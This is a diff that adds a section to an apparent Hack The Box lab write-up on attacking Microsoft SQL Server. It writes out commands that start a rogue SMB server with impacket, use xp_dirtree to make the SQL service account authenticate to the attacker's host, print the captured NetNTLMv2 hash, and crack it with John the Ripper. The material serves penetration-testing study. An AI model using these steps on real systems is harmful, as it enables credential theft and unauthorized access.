@@ -180,4 +180,47 @@ Msg 916, Level 14, State 2, Server WIN-02\SQLEXPRESS, Line 1
 The server principal "htbdbuser" is not able to access the database "flagDB" under the current security context.
 ```
 
+I then tried checking for sysadmin privileges using the command:
+```bash
+1> SELECT IS_SRVROLEMEMBER('sysadmin');
+2> GO
+           
+-----------
+          0
+
+(1 row affected)
+```
+The result was 0, so the user does not have sysadmin privileges.
+
+In the lecture, you learned how to capture the MSSQL service hash. In the “Attacking SMB” section, we discussed setting up a fake SMB server to steal hashes and exploit default Windows implementations. So I attempted capturing the MSSQL service hash starting by creating a rogue SMB server with: 
+
+```bash
+impacket-smbserver SMBShare $(pwd) -smb2support
+```
+
+[![Screenshot-2025-02-26-094132.png](https://i.postimg.cc/hvmQwhxT/Screenshot-2025-02-26-094132.png)](https://postimg.cc/CnFKnhcx)
+
+
+Now, I went back to the MSSQL session and execute it:
+```bash
+1> EXEC xp_dirtree '\\10.10.14.162\share';
+2> GO
+```
+
+On the SMB server log we got a response from the MSSQL server
+
+```bash
+02/26/2025 08:45:46 AM: INFO: Incoming connection (10.129.80.163,49680)
+02/26/2025 08:45:46 AM: INFO: AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
+02/26/2025 08:45:46 AM: INFO: User WIN-02\mssqlsvc authenticated successfully
+02/26/2025 08:45:46 AM: INFO: mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:42de48b66d93419793e4b2476ec7ae4a:01010000000000000049581e5d88db015b991005c475132500000000010010004a0056005600780077004c0069006f00030010004a0056005600780077004c0069006f000200100059005600780051005800630067006a000400100059005600780051005800630067006a00070008000049581e5d88db0106000400020000000800300030000000000000000000000000300000793650267307fee0832b294b8e754840595f9c72aa3ca1e4f14163b981a229e00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100360032000000000000000000
+```
+
+I copied the hash into a file and used John The Ripper to crack it: 
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+[![Screenshot-2025-02-26-095259.png](https://i.postimg.cc/wvvhW60Q/Screenshot-2025-02-26-095259.png)](https://postimg.cc/xkwJ8SrX)
 
